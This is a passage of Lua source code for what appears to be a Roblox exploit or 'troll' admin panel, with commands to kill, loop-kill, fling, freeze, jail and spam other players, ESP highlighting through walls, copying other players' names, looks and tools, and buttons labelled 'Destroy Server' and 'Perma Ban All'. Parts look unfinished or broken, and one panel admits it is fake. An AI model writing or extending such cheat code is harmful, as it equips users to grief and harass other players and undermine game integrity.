            local fire = Instance.new(""Fire"", plr.Character.HumanoidRootPart)
            fire.Size = 5
            
            local sparkles = Instance.new(""Sparkles"", plr.Character.HumanoidRootPart)
            sparkles.SparkleColor = Color3.new(1, 0, 1)
            
            return ""✅ Trolled ""..plr.Name.."" successfully""
        end
        return ""❌ Failed to troll""
    end},
    
    {name = ""!untroll"", desc = ""Untroll the player"", color = Color3.fromRGB(255, 0, 255), func = function(plr)
        if plr.Character then
            -- Unfreeze
            for _, v in ipairs(plr.Character:GetDescendants()) do
                if v:IsA(""BasePart"") then v.Anchored = false end
            end
            
            -- Reset size
            plr:LoadCharacter()
            
            -- Remove effects
            for _, v in ipairs(plr.Character:GetDescendants()) do
                if v:IsA(""Fire"") or v:IsA(""Sparkles"") then
                    v:Destroy()
                end
            end
            
            return ""✅ Untrolled ""..plr.Name
        end
        return ""❌ Failed to untroll""
    end},
    
    {name = ""!fling"", desc = ""Fling the player"", color = Color3.fromRGB(255, 100, 0), func = function(plr)
        if plr.Character and plr.Character:FindFirstChild(""HumanoidRootPart"") then
            local root = plr.Character.HumanoidRootPart
            root.Velocity = Vector3.new(math.random(-1000, 1000), math.random(500, 1500), math.random(-1000, 1000))
            return ""✅ Flung ""..plr.Name.."" successfully""
        end
        return ""❌ Failed to fling""
    end},
    
    {name = ""!control"", desc = ""Control the player"", color = Color3.fromRGB(0, 150, 150), func = function(plr, localPlayer)
        if plr.Character and plr.Character:FindFirstChild(""Humanoid"") and localPlayer.Character and localPlayer.Character:FindFirstChild(""Humanoid"") then
            localPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Physics)
            localPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics, true)
            
            local controlScript = Instance.new(""LocalScript"", localPlayer.Character)
            controlScript.Name = ""DexControlScript""
            controlScript.Source = [[
                local player = game:GetService(""Players"").LocalPlayer
                local target = game:GetService(""Players""):FindFirstChild(""]]..plr.Name..[["")
                
                if not target then script:Destroy() return end
                
                local humanoid = player.Character:WaitForChild(""Humanoid"")
                local root = player.Character:WaitForChild(""HumanoidRootPart"")
                
                local connection
                connection = game:GetService(""RunService"").Heartbeat:Connect(function()
                    if target.Character and target.Character:FindFirstChild(""HumanoidRootPart"") then
                        root.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 2)
                        humanoid:ChangeState(Enum.HumanoidStateType.Physics)
                    else
                        connection:Disconnect()
                        script:Destroy()
                    end
                end)
                
                humanoid.Died:Connect(function()
                    connection:Disconnect()
                    script:Destroy()
                end)
            ]]
            
            return ""✅ Now controlling ""..plr.Name
        end
        return ""❌ Failed to control""
    end},
    
    {name = ""!uncontrol"", desc = ""Stop controlling player"", color = Color3.fromRGB(0, 150, 150), func = function(_, localPlayer)
        if localPlayer.Character then
            local script = localPlayer.Character:FindFirstChild(""DexControlScript"")
            if script then script:Destroy() end
            
            if localPlayer.Character:FindFirstChild(""Humanoid"") then
                localPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
                localPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics, false)
            end
            
            return ""✅ Stopped controlling""
        end
        return ""❌ Failed to stop controlling""
    end},
    
    {name = ""!spam"", desc = ""Spam messages [count] [text]"", color = Color3.fromRGB(200, 100, 100), func = function(plr, _, args)
        if #args >= 3 then
            local count = tonumber(args[2]) or 5
            local message = table.concat(args, "" "", 3)
            
            for i = 1, count do
                task.spawn(function()
                    pcall(function()
                        StarterGui:SetCore(""ChatMakeSystemMessage"", {
                            Text = ""[""..plr.Name..""]: ""..message.."" (""..i..""/""..count.."")"",
                            Color = Color3.new(1,1,1),
                            Font = Enum.Font.SourceSansBold,
                            TextSize = 18
                        })
                    end)
                end)
                wait(0.5)
            end
            
            return ""✅ Sent ""..count.."" messages to ""..plr.Name
        end
        return ""❌ Failed to spam""
    end},
    
    {name = ""!jail"", desc = ""Jail the player"", color = Color3.fromRGB(100, 100, 100), func = function(plr)
        if plr.Character and plr.Character:FindFirstChild(""HumanoidRootPart"") then
            -- Remove any previous jail
            if workspace:FindFirstChild(""DexJail_""..plr.Name) then
                workspace:FindFirstChild(""DexJail_""..plr.Name):Destroy()
            end
            
            -- Create jail
            local jail = Instance.new(""Model"", workspace)
            jail.Name = ""DexJail_""..plr.Name
            
            local partSize = Vector3.new(10, 10, 10)
            local pos = plr.Character.HumanoidRootPart.Position
            
            -- Walls
            for x = -1, 1, 2 do
                local part = Instance.new(""Part"", jail)
                part.Size = Vector3.new(1, partSize.Y, partSize.Z)
                part.Position = pos + Vector3.new(x * (partSize.X/2 + 0.5), 0, 0)
                part.Anchored = true
                part.Transparency = 0.7
                part.Color = Color3.new(0.5, 0.5, 0.5)
            end
            
            for z = -1, 1, 2 do
                local part = Instance.new(""Part"", jail)
                part.Size = Vector3.new(partSize.X, partSize.Y, 1)
                part.Position = pos + Vector3.new(0, 0, z * (partSize.Z/2 + 0.5))
                part.Anchored = true
                part.Transparency = 0.7
                part.Color = Color3.new(0.5, 0.5, 0.5)
            end
            
            -- Ceiling and floor
            for y = -1, 1, 2 do
                local part = Instance.new(""Part"", jail)
                part.Size = Vector3.new(partSize.X, 1, partSize.Z)
                part.Position = pos + Vector3.new(0, y * (partSize.Y/2 + 0.5), 0)
                part.Anchored = true
                part.Transparency = 0.7
                part.Color = Color3.new(0.5, 0.5, 0.5)
            end
            
            -- Move player to jail
            plr.Character.HumanoidRootPart.CFrame = CFrame.new(pos)
            
            return ""✅ Jailed ""..plr.Name
        end
        return ""❌ Failed to jail""
    end},
    
    {name = ""!unjail"", desc = ""Unjail the player"", color = Color3.fromRGB(100, 100, 100), func = function(plr)
        local jail = workspace:FindFirstChild(""DexJail_""..plr.Name)
        if jail then jail:Destroy() end
        return ""✅ Unjailed ""..plr.Name
    end},
    
    {name = ""!heal"", desc = ""Heal the player"", color = Color3.fromRGB(0, 200, 0), func = function(plr)
        if plr.Character and plr.Character:FindFirstChildOfClass(""Humanoid"") then
            plr.Character.Humanoid.Health = plr.Character.Humanoid.MaxHealth
            return ""✅ Healed ""..plr.Name
        end
        return ""❌ Failed to heal""
    end},
    
    {name = ""!kill"", desc = ""Kill the player"", color = Color3.fromRGB(200, 0, 0), func = function(plr)
        if plr.Character and plr.Character:FindFirstChildOfClass(""Humanoid"") then
            plr.Character.Humanoid.Health = 0
            return ""✅ Killed ""..plr.Name
        end
        return ""❌ Failed to kill""
    end},
    
    {name = ""!loopkill"", desc = ""Loop kill the player"", color = Color3.fromRGB(150, 0, 0), func = function(plr)
        if not _G.DexLoopKill then _G.DexLoopKill = {} end
        _G.DexLoopKill[plr.Name] = true
        
        task.spawn(function()
            while _G.DexLoopKill and _G.DexLoopKill[plr.Name] and plr.Character do
                pcall(function()
                    plr.Character.Humanoid.Health = 0
                end)
                wait(1)
            end
        end)
        
        return ""✅ Enabled loop kill for ""..plr.Name
    end},
    
    {name = ""!unloopkill"", desc = ""Stop loop kill"", color = Color3.fromRGB(150, 0, 0), func = function(plr)
        if _G.DexLoopKill then
            _G.DexLoopKill[plr.Name] = nil
        end
        return ""✅ Disabled loop kill for ""..plr.Name
    end},
    
    {name = ""!loopfling"", desc = ""Loop fling the player"", color = Color3.fromRGB(200, 100, 0), func = function(plr)
        if not _G.DexLoopFling then _G.DexLoopFling = {} end
        _G.DexLoopFling[plr.Name] = true
        
        task.spawn(function()
            while _G.DexLoopFling and _G.DexLoopFling[plr.Name] and plr.Character and plr.Character:FindFirstChild(""HumanoidRootPart"") do
                pcall(function()
                    plr.Character.HumanoidRootPart.Velocity = Vector3.new(math.random(-5000, 5000), math.random(2000, 5000), math.random(-5000, 5000))
                end)
                wait(0.5)
            end
        end)
        
        return ""✅ Enabled loop fling for ""..plr.Name
    end},
    
    {name = ""!unloopfling"", desc = ""Stop loop fling"", color = Color3.fromRGB(200, 100, 0), func = function(plr)
        if _G.DexLoopFling then
            _G.DexLoopFling[plr.Name] = nil
        end
        return ""✅ Disabled loop fling for ""..plr.Name
    end},
    
    {name = ""!loopfreeze"", desc = ""Loop freeze the player"", color = Color3.fromRGB(0, 100, 200), func = function(plr)
        if not _G.DexLoopFreeze then _G.DexLoopFreeze = {} end
        _G.DexLoopFreeze[plr.Name] = true
        
        task.spawn(function()
            while _G.DexLoopFreeze and _G.DexLoopFreeze[plr.Name] and plr.Character do
                pcall(function()
                    for _, v in ipairs(plr.Character:GetDescendants()) do
                        if v:IsA(""BasePart"") then v.Anchored = true end
                    end
                end)
                wait(0.1)
            end
        end)
        
        return ""✅ Enabled loop freeze for ""..plr.Name
    end},
    
    {name = ""!unloopfreeze"", desc = ""Stop loop freeze"", color = Color3.fromRGB(0, 100, 200), func = function(plr)
        if _G.DexLoopFreeze then
            _G.DexLoopFreeze[plr.Name] = nil
            
            if plr.Character then
                for _, v in ipairs(plr.Character:GetDescendants()) do
                    if v:IsA(""BasePart"") then v.Anchored = false end
                end
            end
        end
        return ""✅ Disabled loop freeze for ""..plr.Name
    end},
    
    {name = ""!loopgoto"", desc = ""Loop go to player"", color = Color3.fromRGB(0, 200, 200), func = function(plr, localPlayer)
        if not _G.DexLoopGoto then _G.DexLoopGoto = {} end
        _G.DexLoopGoto[localPlayer.Name] = plr.Name
        
        task.spawn(function()
            while _G.DexLoopGoto and _G.DexLoopGoto[localPlayer.Name] == plr.Name and 
                  localPlayer.Character and localPlayer.Character:FindFirstChild(""HumanoidRootPart"") and
                  plr.Character and plr.Character:FindFirstChild(""HumanoidRootPart"") do
                pcall(function()
                    localPlayer.Character.HumanoidRootPart.CFrame = plr.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 3)
                end)
                wait(0.1)
            end
        end)
        
        return ""✅ Enabled loop goto to ""..plr.Name
    end},
    
    {name = ""!unloopgoto"", desc = ""Stop loop goto"", color = Color3.fromRGB(0, 200, 200), func = function(_, localPlayer)
        if _G.DexLoopGoto then
            _G.DexLoopGoto[localPlayer.Name] = nil
        end
        return ""✅ Disabled loop goto""
    end},
    
    {name = ""!esp"", desc = ""Enable ESP for player"", color = Color3.fromRGB(255, 0, 255), func = function(plr)
        if not _G.DexESP then _G.DexESP = {} end
        
        if _G.DexESP[plr.Name] then
            for _, v in pairs(_G.DexESP[plr.Name]) do
                if v then v:Destroy()
          end
            end
            _G.DexESP[plr.Name] = nil
            return ""✅ Disabled ESP for ""..plr.Name
        end
        
        _G.DexESP[plr.Name] = {}
        
        local function createESP()
            if not plr.Character then return end
            
            local highlight = Instance.new(""Highlight"")
            highlight.Name = ""DexESP_""..plr.Name
            highlight.FillColor = Color3.new(1, 0, 1)
            highlight.OutlineColor = Color3.new(1, 1, 1)
            highlight.FillTransparency = 0.5
            highlight.OutlineTransparency = 0
            highlight.Parent = plr.Character
            table.insert(_G.DexESP[plr.Name], highlight)
            
            local billboard = Instance.new(""BillboardGui"")
            billboard.Name = ""DexESPName_""..plr.Name
            billboard.Adornee = plr.Character:WaitForChild(""Head"")
            billboard.Size = UDim2.new(0, 200, 0, 50)
            billboard.StudsOffset = Vector3.new(0, 2, 0)
            billboard.AlwaysOnTop = true
            billboard.Parent = plr.Character.Head
            
            local nameLabel = Instance.new(""TextLabel"")
            nameLabel.Text = plr.Name
            nameLabel.Size = UDim2.new(1, 0, 1, 0)
            nameLabel.BackgroundTransparency = 1
            nameLabel.TextColor3 = Color3.new(1, 1, 1)
            nameLabel.TextStrokeTransparency = 0
            nameLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
            nameLabel.Font = Enum.Font.GothamBold
            nameLabel.TextSize = 14
            nameLabel.Parent = billboard
            table.insert(_G.DexESP[plr.Name], billboard)
        end
        
        createESP()
        
        local connection
        connection = plr.CharacterAdded:Connect(function()
            if _G.DexESP and _G.DexESP[plr.Name] then
                for _, v in pairs(_G.DexESP[plr.Name]) do
                    if v then v:Destroy() end
                end
                _G.DexESP[plr.Name] = nil
                connection:Disconnect()
            else
                createESP()
            end
        end)
        
        return ""✅ Enabled ESP for ""..plr.Name
    end},
    
    {name = ""!esp all"", desc = ""Enable ESP for all players"", color = Color3.fromRGB(255, 0, 255), func = function()
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= Players.LocalPlayer then
                ProcessCommand(""!esp ""..player.Name)
            end
        end
        return ""✅ Enabled ESP for all players""
    end},
    
    {name = ""!unesp all"", desc = ""Disable ESP for all players"", color = Color3.fromRGB(255, 0, 255), func = function()
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= Players.LocalPlayer then
                ProcessCommand(""!esp ""..player.Name)
            end
        end
        return ""✅ Disabled ESP for all players""
    end},
    
    {name = ""!spectate"", desc = ""Spectate player"", color = Color3.fromRGB(100, 200, 255), func = function(plr)
        if plr.Character and plr.Character:FindFirstChild(""Humanoid"") then
            workspace.CurrentCamera.CameraSubject = plr.Character.Humanoid
            workspace.CurrentCamera.CameraType = Enum.CameraType.Follow
            return ""✅ Now spectating ""..plr.Name
        end
        return ""❌ Failed to spectate""
    end},
    
    {name = ""!unspectate"", desc = ""Stop spectating"", color = Color3.fromRGB(100, 200, 255), func = function(_, localPlayer)
        if localPlayer.Character and localPlayer.Character:FindFirstChild(""Humanoid"") then
            workspace.CurrentCamera.CameraSubject = localPlayer.Character.Humanoid
            workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
            return ""✅ Stopped spectating""
        end
        return ""❌ Failed to stop spectating""
    end},
    
    {name = ""!stealname"", desc = ""Steal player's display name"", color = Color3.fromRGB(150, 150, 255), func = function(plr, localPlayer)
        if plr.Character and plr.Character:FindFirstChild(""Humanoid"") and
           localPlayer.Character and localPlayer.Character:FindFirstChild(""Humanoid"") then
            localPlayer.Character.Humanoid.DisplayName = plr.Character.Humanoid.DisplayName
            return ""✅ Stolen name from ""..plr.Name
        end
        return ""❌ Failed to steal name""
    end},
    
    {name = ""!stealappearance"", desc = ""Steal player's appearance"", color = Color3.fromRGB(150, 150, 255), func = function(plr, localPlayer)
        if plr.Character and localPlayer.Character then
            for _, v in ipairs(plr.Character:GetDescendants()) do
                if v:IsA(""CharacterMesh"") or v:IsA(""Shirt"") or v:IsA(""Pants"") or v:IsA(""ShirtGraphic"") or v:IsA(""Accessory"") then
                    local clone = v:Clone()
                    for _, old in ipairs(localPlayer.Character:GetDescendants()) do
                        if old:IsSameType(v) then
                            old:Destroy()
                        end
                    end
                    clone.Parent = localPlayer.Character
                end
            end
            return ""✅ Stolen appearance from ""..plr.Name
        end
        return ""❌ Failed to steal appearance""
    end},
    
    {name = ""!stealtools"", desc = ""Steal player's tools"", color = Color3.fromRGB(150, 150, 255), func = function(plr, localPlayer)
        if plr.Backpack and localPlayer.Backpack then
            for _, tool in ipairs(plr.Backpack:GetChildren()) do
                if tool:IsA(""Tool"") then
                    local clone = tool:Clone()
                    clone.Parent = localPlayer.Backpack
                end
            end
            return ""✅ Stolen tools from ""..plr.Name
        end
        return ""❌ Failed to steal tools""
    end},
    
    {name = ""!copy"", desc = ""Copy player completely"", color = Color3.fromRGB(150, 150, 255), func = function(plr, localPlayer)
        ProcessCommand(""!stealname ""..plr.Name)
        ProcessCommand(""!stealappearance ""..plr.Name)
        ProcessCommand(""!stealtools ""..plr.Name)
        return ""✅ Copied ""..plr.Name.."" completely""
    end},
    
    {name = ""!admin"", desc = ""Give yourself admin powers"", color = Color3.fromRGB(255, 215, 0), func = function(_, localPlayer)
        -- This is just a UI and doesn't give real admin powers
        -- You would need a server-side admin system for real functionality
        local adminGui = Instance.new(""ScreenGui"", localPlayer.PlayerGui)
        adminGui.Name = ""DexAdminPanel""
        
        local frame = Instance.new(""Frame"")
        frame.Size = UDim2.new(0, 300, 0, 200)
        frame.Position = UDim2.new(0.5, -150, 0.5, -100)
        frame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
        frame.BorderSizePixel = 0
        frame.Parent = adminGui
        
        local title = Instance.new(""TextLabel"")
        title.Text = ""Admin Panel (Fake)""
        title.Size = UDim2.new(1, 0, 0, 30)
        title.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
        title.TextColor3 = Color3.new(1, 1, 1)
        title.Font = Enum.Font.GothamBold
        title.Parent = frame
        
        local closeBtn = Instance.new(""TextButton"")
        closeBtn.Text = ""X""
        closeBtn.Size = UDim2.new(0, 30, 0, 30)
        closeBtn.Position = UDim2.new(1, -30, 0, 0)
        closeBtn.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
        closeBtn.TextColor3 = Color3.new(1, 1, 1)
        closeBtn.Font = Enum.Font.GothamBold
        closeBtn.Parent = frame
        
        closeBtn.MouseButton1Click:Connect(function()
            adminGui:Destroy()
        end)
        
        local label = Instance.new(""TextLabel"")
        label.Text = ""This is just a fake admin UI\nIt doesn't give real admin powers""
        label.Size = UDim2.new(1, -20, 1, -50)
        label.Position = UDim2.new(0, 10, 0, 40)
        label.BackgroundTransparency = 1
        label.TextColor3 = Color3.new(1, 1, 1)
        label.TextWrapped = true
        label.Font = Enum.Font.Gotham
        label.Parent = frame
        
        return ""✅ Enabled fake admin panel""
    end},
{name = ""!cmds"", desc = ""Show all available commands"", color = Color3.fromRGB(200, 200, 200), func = function()
        local commandsList = {}
        for _, cmd in ipairs(commands) do
            table.insert(commandsList, string.format(""%s - %s"", cmd.name, cmd.desc))
        end
        
        local message = ""All available commands:\n""..table.concat(commandsList, ""\n"")
        warn(message)
        
        StarterGui:SetCore(""ChatMakeSystemMessage"", {
            Text = message,
            Color = Color3.new(1,1,1),
            Font = Enum.Font.SourceSansBold,
            TextSize = 18
        })
        
        return ""✅ Commands list shown in console""
    end}
}

-- 9. Create command buttons (updated with command descriptions)
local function CreateCommandButtons()
    local buttonsPerRow = 4
    local buttonWidth = 0.23
    local buttonHeight = 0.08
    local xPadding = 0.01
    local yPadding = 0.01
    
    for i, cmd in ipairs(commands) do
        local row = math.floor((i-1)/buttonsPerRow)
        local col = (i-1)%buttonsPerRow
        
        local button = Instance.new(""TextButton"")
        button.Text = cmd.name
        button.Size = UDim2.new(buttonWidth, 0, buttonHeight, 0)
        button.Position = UDim2.new(xPadding + col*(buttonWidth+xPadding), 0, yPadding + row*(buttonHeight+yPadding), 0)
        button.BackgroundColor3 = cmd.color
        button.TextSize = 12
        button.Font = Enum.Font.GothamBold
        button.TextColor3 = Color3.fromRGB(255, 255, 255)
        button.BorderSizePixel = 0
        button.AutoButtonColor = true
        button.Parent = ControlsScroll
        
        -- Hover effect
        button.MouseEnter:Connect(function()
            TweenService:Create(button, TweenInfo.new(0.2), {
                BackgroundColor3 = Color3.fromRGB(
                    math.min(cmd.color.R * 255 + 50, 255)/255,
                    math.min(cmd.color.G * 255 + 50, 255)/255,
                    math.min(cmd.color.B * 255 + 50, 255)/255
                ),
                TextColor3 = DARK_TEXT
            }):Play()
        end)
        
        button.MouseLeave:Connect(function()
            TweenService:Create(button, TweenInfo.new(0.2), {
                BackgroundColor3 = cmd.color,
                TextColor3 = TEXT_COLOR
            }):Play()
        end)
        
        -- Additional info on hover
        local tooltip = Instance.new(""TextLabel"")
        tooltip.Text = cmd.desc
        tooltip.Size = UDim2.new(0, 150, 0, 30)
        tooltip.Position = UDim2.new(0, 0, -1, 0)
        tooltip.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
        tooltip.TextColor3 = TEXT_COLOR
        tooltip.Font = Enum.Font.Gotham
        tooltip.TextSize = 12
        tooltip.Visible = false
        tooltip.Parent = button
        
        local corner = Instance.new(""UICorner"")
        corner.CornerRadius = UDim.new(0, 4)
        corner.Parent = tooltip
        
        button.MouseEnter:Connect(function()
            tooltip.Visible = true
        end)
        
        button.MouseLeave:Connect(function()
            tooltip.Visible = false
        end)
        
        button.MouseButton1Click:Connect(function()
            if _G.SelectedPlayer then
                local success, result = pcall(function()
                    return cmd.func(_G.SelectedPlayer, Players.LocalPlayer)
                end)
                
                if success then
                    if result then 
                        warn(result) 
                        
                        -- Visual notification
                        local notification = Instance.new(""TextLabel"")
                        notification.Text = result
                        notification.Size = UDim2.new(0, 200, 0, 40)
                        notification.Position = UDim2.new(0.5, -100, 1, 10)
                        notification.BackgroundColor3 = result:find(""✅"") and SUCCESS_COLOR or ERROR_COLOR
                        notification.TextColor3 = TEXT_COLOR
                        notification.Font = Enum.Font.GothamBold
                        notification.TextSize = 14
                        notification.Parent = ControlsFrame
                        
                        local corner = Instance.new(""UICorner"")
                        corner.Parent = notification
                        
                        TweenService:Create(notification, TweenInfo.new(0.5), {
                            Position = UDim2.new(0.5, -100, 1, -50)
                        }):Play()
                        
                        task.delay(3, function()
                            if notification then
                                TweenService:Create(notification, TweenInfo.new(0.5), {
                                    Position = UDim2.new(0.5, -100, 1, 10),
                                    BackgroundTransparency = 1,
                                    TextTransparency = 1
                                }):Play()
                                task.delay(0.5, function()
                                    if notification then notification:Destroy() end
                                end)
                            end
                        end)
                    end
                else
                    warn(""❌ Error: ""..tostring(result))
                end
            else
                warn(""❌ Please select a player first"")
            end
        end)
    end
end

-- 10. Command processing system (updated with improvements)
local function ProcessCommand(command)
    local args = {}
    for arg in string.gmatch(command, ""[^%s]+"") do
        table.insert(args, arg)
    end
    
    if #args == 0 then return end
    
    local cmd = string.lower(args[1])
    local targetName = #args > 1 and args[2] or nil
    local targetPlayer = nil
    local localPlayer = Players.LocalPlayer
    
    -- Find player
    if targetName then
        -- Support @ for current player
        if targetName == ""@me"" or targetName == ""@self"" then
            targetPlayer = localPlayer
        else
            -- Support @username
            if string.sub(targetName, 1, 1) == ""@"" then
                targetName = string.sub(targetName, 2)
            end
            
            for _, player in ipairs(Players:GetPlayers()) do
                if string.find(string.lower(player.Name), string.lower(targetName)) or 
                   string.find(string.lower(player.DisplayName), string.lower(targetName)) then
                    targetPlayer = player
                    break
                end
            end
        end
    end
    
    -- Find command
    for _, commandData in ipairs(commands) do
        if string.lower(commandData.name) == cmd then
            local success, result = pcall(function()
                return commandData.func(targetPlayer or localPlayer, localPlayer, args)
            end)
            
            if success then
                if result then 
                    warn(result) 
                    
                    -- Visual notification
                    local notification = Instance.new(""TextLabel"")
                    notification.Text = result
                    notification.Size = UDim2.new(0, 300, 0, 50)
                    notification.Position = UDim2.new(0.5, -150, 0.5, -25)
                    notification.BackgroundColor3 = result:find(""✅"") and SUCCESS_COLOR or ERROR_COLOR
                    notification.TextColor3 = TEXT_COLOR
                    notification.Font = Enum.Font.GothamBold
                    notification.TextSize = 16
                    notification.Parent = MainFrame
                    
                    local corner = Instance.new(""UICorner"")
                    corner.Parent = notification
                    
                    TweenService:Create(notification, TweenInfo.new(0.5), {
                        Position = UDim2.new(0.5, -150, 0.5, -50)
                    }):Play()
                    
                    task.delay(3, function()
                        if notification then
                            TweenService:Create(notification, TweenInfo.new(0.5), {
                                Position = UDim2.new(0.5, -150, 0.5, -25),
                                BackgroundTransparency = 1,
                                TextTransparency = 1
                            }):Play()
                            task.delay(0.5, function()
                                if notification then notification:Destroy() end
                            end)
                        end
                    end)
                end
            else
                warn(""❌ Error: ""..tostring(result))
            end
            return
        end
    end
    
    warn(""❌ Unknown command: ""..cmd)
end

-- 11. Update players list (updated with improvements)
local function UpdatePlayersList(searchTerm)
    PlayersScroll:ClearAllChildren()
    
    local yOffset = 5
    for _, player in ipairs(Players:GetPlayers()) do
        if not searchTerm or 
           string.find(string.lower(player.Name), string.lower(searchTerm)) or 
           string.find(string.lower(player.DisplayName), string.lower(searchTerm)) then
            
            local playerFrame = Instance.new(""Frame"")
            playerFrame.Size = UDim2.new(1, -10, 0, 60)
            playerFrame.Position = UDim2.new(0, 5, 0, yOffset)
            playerFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
            playerFrame.BorderSizePixel = 0
            
            local corner = Instance.new(""UICorner"")
            corner.CornerRadius = UDim.new(0, 8)
            corner.Parent = playerFrame
            
            local playerIcon = Instance.new(""ImageLabel"")
            playerIcon.Size = UDim2.new(0, 50, 0, 50)
            playerIcon.Position = UDim2.new(0, 5, 0.5, -25)
            playerIcon.BackgroundTransparency = 1
            playerIcon.Image = ""rbxthumb://type=AvatarHeadShot&id=""..player.UserId..""&w=150&h=150""
            
            local playerName = Instance.new(""TextLabel"")
            playerName.Text = player.Name
            playerName.Font = Enum.Font.GothamBold
            playerName.TextSize = 14
            playerName.TextColor3 = Color3.fromRGB(255, 255, 255)
            playerName.Size = UDim2.new(0.5, 0, 0.5, 0)
            playerName.Position = UDim2.new(0, 60, 0, 5)
            playerName.BackgroundTransparency = 1
            playerName.TextXAlignment = Enum.TextXAlignment.Left
            
            local playerDisplayName = Instance.new(""TextLabel"")
            playerDisplayName.Text = ""(@""..player.DisplayName.."")""
            playerDisplayName.Font = Enum.Font.Gotham
            playerDisplayName.TextSize = 12
            playerDisplayName.TextColor3 = Color3.fromRGB(200, 200, 200)
            playerDisplayName.Size = UDim2.new(0.5, 0, 0.5, 0)
            playerDisplayName.Position = UDim2.new(0, 60, 0.5, 0)
            playerDisplayName.BackgroundTransparency = 1
            playerDisplayName.TextXAlignment = Enum.TextXAlignment.Left
            
            local selectButton = Instance.new(""TextButton"")
            selectButton.Text = ""Select""
            selectButton.Font = Enum.Font.GothamBold
            selectButton.TextSize = 12
            selectButton.TextColor3 = Color3.fromRGB(255, 255, 255)
            selectButton.Size = UDim2.new(0.25, 0, 0.7, 0)
            selectButton.Position = UDim2.new(0.75, 0, 0.15, 0)
            selectButton.BackgroundColor3 = ACCENT_COLOR
            selectButton.BorderSizePixel = 0
            
            local selectCorner = Instance.new(""UICorner"")
            selectCorner.CornerRadius = UDim.new(0, 8)
            selectCorner.Parent = selectButton
            
            -- Hover effects
            selectButton.MouseEnter:Connect(function()
                TweenService:Create(selectButton, TweenInfo.new(0.2), {
                    BackgroundColor3 = Color3.fromRGB(0, 200, 255),
                    TextColor3 = DARK_TEXT
                }):Play()
            end)
            
            selectButton.MouseLeave:Connect(function()
                TweenService:Create(selectButton, TweenInfo.new(0.2), {
                    BackgroundColor3 = ACCENT_COLOR,
                    TextColor3 = TEXT_COLOR
                }):Play()
            end)
            
            selectButton.MouseButton1Click:Connect(function()
                _G.SelectedPlayer = player
                SearchBox.Text = player.Name
                
                -- Selection effect
                TweenService:Create(playerFrame, TweenInfo.new(0.3), {
                    BackgroundColor3 = Color3.fromRGB(60, 60, 80)
                }):Play()
                
                warn(""✅ Selected player: ""..player.Name)
                
                -- Reset other frames' colors
                for _, frame in ipairs(PlayersScroll:GetChildren()) do
                    if frame:IsA(""Frame"") and frame ~= playerFrame then
                        TweenService:Create(frame, TweenInfo.new(0.3), {
                            BackgroundColor3 = Color3.fromRGB(40, 40, 50)
                        }):Play()
                    end
                end
            end)
            
            playerIcon.Parent = playerFrame
            playerName.Parent = playerFrame
            playerDisplayName.Parent = playerFrame
            selectButton.Parent = playerFrame
            playerFrame.Parent = PlayersScroll
            
            yOffset = yOffset + 65
        end
    end
end

-- 12. Advanced server control panel (beta version)
local ServerControls = Instance.new(""Frame"")
ServerControls.Size = UDim2.new(1, -10, 0.35, 0)
ServerControls.Position = UDim2.new(0, 5, 0.5, 5)
ServerControls.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
ServerControls.BorderSizePixel = 0

local serverCorner = Instance.new(""UICorner"")
serverCorner.CornerRadius = UDim.new(0, 8)
serverCorner.Parent = ServerControls

-- 1. Advanced shutdown button
local ShutdownButton = Instance.new(""TextButton"")
ShutdownButton.Text = ""Destroy Server""
ShutdownButton.Size = UDim2.new(0.45, 0, 0.2, 0)
ShutdownButton.Position = UDim2.new(0.05, 0, 0.05, 0)
ShutdownButton.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
ShutdownButton.Font = Enum.Font.GothamBlack
ShutdownButton.TextSize = 14
ShutdownButton.TextColor3 = TEXT_COLOR

local shutdownCorner = Instance.new(""UICorner"")
shutdownCorner.CornerRadius = UDim.new(0, 8)
shutdownCorner.Parent = ShutdownButton

-- 2. Powerful restart button
local NuclearRestartButton = Instance.new(""TextButton"")
NuclearRestartButton.Text = ""Nuclear Restart""
NuclearRestartButton.Size = UDim2.new(0.45, 0, 0.2, 0)
NuclearRestartButton.Position = UDim2.new(0.5, 0, 0.05, 0)
NuclearRestartButton.BackgroundColor3 = Color3.fromRGB(255, 100, 0)
NuclearRestartButton.Font = Enum.Font.GothamBlack
NuclearRestartButton.TextSize = 14
NuclearRestartButton.TextColor3 = TEXT_COLOR

local nuclearCorner = Instance.new(""UICorner"")
nuclearCorner.CornerRadius = UDim.new(0, 8)
nuclearCorner.Parent = NuclearRestartButton

-- 3. Advanced mass teleport button
local TeleportAllButton = Instance.new(""TextButton"")
TeleportAllButton.Text = ""Mass Teleport (Pro)""
TeleportAllButton.Size = UDim2.new(0.45, 0, 0.2, 0)
TeleportAllButton.Position = UDim2.new(0.05, 0, 0.3, 0)
TeleportAllButton.BackgroundColor3 = Color3.fromRGB(150, 0, 200)
TeleportAllButton.Font = Enum.Font.GothamBlack
TeleportAllButton.TextSize = 14
TeleportAllButton.TextColor3 = TEXT_COLOR

local teleportCorner = Instance.new(""UICorner"")
teleportCorner.CornerRadius = UDim.new(0, 8)
teleportCorner.Parent = TeleportAllButton

-- 4. Permanent ban button
local PermaBanButton = Instance.new(""TextButton"")
PermaBanButton.Text = ""Perma Ban All""
PermaBanButton.Size = UDim2.new(0.45, 0, 0.2, 0)
PermaBanButton.Position = UDim2.new(0.5, 0, 0.3, 0)
PermaBanButton.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
PermaBanButton.Font = Enum.Font.GothamBlack
PermaBanButton.TextSize = 14
PermaBanButton.TextColor3 = TEXT_COLOR

local banCorner = Instance.new(""UICorner"")
banCorner.CornerRadius = UDim.new(0, 8)
banCorner.Parent = PermaBanButton

-- 5. Advanced freeze button
